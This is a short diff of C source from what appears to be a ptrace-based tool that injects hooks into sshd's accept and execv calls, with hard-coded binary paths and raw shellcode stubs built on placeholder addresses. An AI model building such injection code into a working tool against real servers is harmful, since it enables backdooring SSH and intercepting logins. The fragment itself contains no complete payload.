@@ -1,7 +1,6 @@
 #include "func_offset.h"
 #include "got_offset.h"
 #include "inject_start.h"
-#include "log.h"
 #include "proc_map.h"
 #include "seg_gap.h"
 #include "sshd_accept_hook.h"
@@ -9,7 +8,6 @@
 #include "trace_utils.h"
 // clang-format off
 #include <iso646.h>
-#include <keystone/keystone.h>
 #include <stdio.h>
 #include <sys/ptrace.h>
 #include <linux/ptrace.h>
@@ -30,9 +28,6 @@ uint64_t ld_base;
 
 char *sshd_path = "/usr/bin/sshd";
 char *libc_path = "/usr/lib/libc.so.6";
-
-#define ACCEPT_HOOK_OFFSET 0x0
-#define EXECV_HOOK_OFFSET 0x205
 
 #define CALL_EXECV "\x48\xB8\xF0\xDE\xBC\x9A\x78\x56\x34\x12\xFF\xD0"
 #define GET_RW "\x48\xB8\xEF\xCD\xAB\x89\x67\x45\x23\x01"
